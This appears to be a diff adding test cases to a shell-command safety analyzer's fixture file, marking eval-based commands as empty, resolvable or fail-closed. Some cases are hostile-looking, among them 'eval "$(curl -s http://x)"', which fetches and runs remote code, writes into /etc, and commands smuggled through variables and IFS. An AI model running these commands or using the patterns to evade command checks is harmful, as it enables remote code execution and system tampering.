@@ -79,3 +79,25 @@
 {"src":"gh1887","cmd":"perl -e 'select(undef,undef,undef,$t{x})'","expect":"fail_closed"}
 {"src":"gh1887","cmd":"perl -e '$o->select(undef,undef,undef,1)'","expect":"fail_closed"}
 {"src":"gh1887","cmd":"perl -e 'select(undef,undef,undef,1); undef $x'","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"for c in \"bash tests/l1-lint/a.sh\" \"bash tests/l1-lint/b.sh\"; do eval $c 2>&1 | tail -1; done","expect":"empty"}
+{"src":"GH 1913","cmd":"c='ls -la'; eval \"$c\"","expect":"empty"}
+{"src":"GH 1913","cmd":"command -v bash; bash --version | head -1","expect":"empty"}
+{"src":"GH 1913","cmd":"for c in \"touch a\" \"touch b\"; do eval $c; done","expect":"resolves","paths":["/w/a","/w/b"]}
+{"src":"GH 1913","cmd":"eval \"$(curl -s http://x)\"","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"bash <<<\"$x\"","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"bash -c \"$v\"","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"for c in \"ls\" \"$x\"; do eval $c; done","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"for c in *; do eval $c; done","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"c=$(cat f); eval $c","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"for c in \"ls\"; do c=$y; eval $c; done","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"for a in 1 2 3 4 5; do for b in 1 2 3 4; do eval \"touch /w/$a$b\"; done; done","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"for c in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17; do eval touch /w/$c; done","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"c=/etc/p1913; eval \"touch $c\"","expect":"fail_closed","danger":"/etc/p1913"}
+{"src":"GH 1913","cmd":"c=ls; eval \"read c\"; eval $c","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"c=ls; for i in 1 2; do eval $c; eval \"read c\"; done","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"c='touch #/../x'; eval \"$c\"; eval '$c'","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"c=ls; eval $c > $c","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"IFS=x; c=touchxa; eval $c","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"c=\"cd /etc\"; eval $c; touch f","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"for c in \"touch \"{a,/etc/x}; do eval $c; done","expect":"fail_closed"}
+{"src":"GH 1913","cmd":"c='touch *'; eval $c","expect":"fail_closed"}
